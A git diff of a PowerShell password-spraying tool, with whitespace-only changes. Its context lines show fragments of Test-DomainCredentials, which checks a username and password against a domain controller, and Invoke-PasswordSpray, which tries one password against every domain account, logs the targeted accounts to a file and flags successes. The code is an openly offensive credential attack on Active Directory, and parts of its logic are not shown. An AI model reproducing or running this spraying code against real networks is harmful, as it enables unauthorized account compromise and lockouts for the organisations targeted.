@@ -37,14 +37,14 @@ function Test-DomainCredentials {
     param(
         [Parameter(ValueFromPipeline=$true)]
         [String]$DomainController = (Get-PDC),
-
+
         [Parameter(Mandatory=$true)]
         [String]$username,
-
+
         [Parameter(Mandatory=$true)]
         [String]$password
     )
-
+
     "[-] Testing $DomainController\$username with $password " + (Get-Date).DateTime
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain',$DomainController)
@@ -54,7 +54,7 @@ function Test-DomainCredentials {
         "[+] SUCCESS *********"
     }
 }
-function Invoke-PasswordSpray {
+function Invoke-PasswordSpray {
         [cmdletbinding()]
         param(
         [Parameter()]
@@ -71,7 +71,7 @@ function Test-DomainCredentials {
     $filename = "NoCaCUsers_" + (Get-Date -Format s) + ".txt"
     $accounts | out-file $filename
     # if the password is not defined use the default list
-
+
     "[-] Trying $password against all users. Starting " + (Get-Date -Format s)
     "[-] " + $accounts.Count + "accounts will be tested"
     foreach($username in $accounts.Keys){
@@ -82,6 +82,4 @@ function Test-DomainCredentials {
    "[-] Finished all usernames in the list at " + (Get-Date -Format s)
     Stop-Transcript
 }
-
-
 
